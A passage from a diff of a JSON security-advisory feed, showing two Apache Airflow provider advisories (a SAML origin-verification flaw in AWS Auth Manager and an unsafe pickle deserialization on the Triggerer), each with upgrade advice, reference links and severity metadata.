+          "content_html": "<p>In AWS Auth manager, the origin of the SAML authentication has been used as provided by the client and not verified against the actual instance URL.&nbsp;\nThis allowed to gain access to different instances with potentially different access controls by reusing SAML response from other instances.</p>\n<p>You should upgrade to 9.22.0 version of provider if you use AWS Auth Manager.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-25604\">https://nvd.nist.gov/vuln/detail/CVE-2026-25604</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/61368\">https://github.com/apache/airflow/pull/61368</a></li>\n<li><a href=\"https://lists.apache.org/thread/spwwrsmwxod7fpttcd7n7zs46j839l77\">https://lists.apache.org/thread/spwwrsmwxod7fpttcd7n7zs46j839l77</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2026/03/09/6\">http://www.openwall.com/lists/oss-security/2026/03/09/6</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/1a86aec01d827ba8caf41b645db56663a9a61850\">https://github.com/apache/airflow/commit/1a86aec01d827ba8caf41b645db56663a9a61850</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rv5f-ccpm-xjj4\">https://github.com/advisories/GHSA-rv5f-ccpm-xjj4</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T01:22:22.000Z",
+          "date_published": "2026-03-09T12:31:38.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-rv5f-ccpm-xjj4"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "7ba6cb26ac5513f81c6f4b56ba65870e",
+        "url": "https://github.com/advisories/GHSA-9r5j-7r2x-rv4g",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[apache-airflow-providers-http] Apache Airflow Providers Http has Unsafe Pickle Deserializatio leading to RCE via HttpOperator",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-9r5j-7r2x-rv4g"
+          ],
+          "content_hash": "sha256:93a977236bfa34d59bb09d3c445f94aa3bda50a267daa7af4fef971be5ef3f45"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-9r5j-7r2x-rv4g"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<p>A user with access to the DB could craft a database entry that would result in executing code on Triggerer - which gives anyone who have access to DB the same permissions as Dag Author. Since direct DB access is not usual and recommended for Airflow, the likelihood of it making any damage is low.</p>\n<p>Users should upgrade to version 6.0.0 of the provider to avoid even that risk.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-69219\">https://nvd.nist.gov/vuln/detail/CVE-2025-69219</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/61662\">https://github.com/apache/airflow/pull/61662</a></li>\n<li><a href=\"https://lists.apache.org/thread/zjkfb2njklro68tqzym092r4w65m5dq0\">https://lists.apache.org/thread/zjkfb2njklro68tqzym092r4w65m5dq0</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2026/03/09/1\">http://www.openwall.com/lists/oss-security/2026/03/09/1</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/97839f7b0a8ae66d6079bb7fad5a363068f61617\">https://github.com/apache/airflow/commit/97839f7b0a8ae66d6079bb7fad5a363068f61617</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9r5j-7r2x-rv4g\">https://github.com/advisories/GHSA-9r5j-7r2x-rv4g</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T01:21:25.000Z",
+          "date_published": "2026-03-09T12:31:38.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-9r5j-7r2x-rv4g"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      }
+    ],
+    "updated": [],
+    "removed": []
+  },
+  "counts": {
+    "items": 20,
+    "updated": 0,
+    "removed": 0
+  },
+  "integrity_reset": false
+}
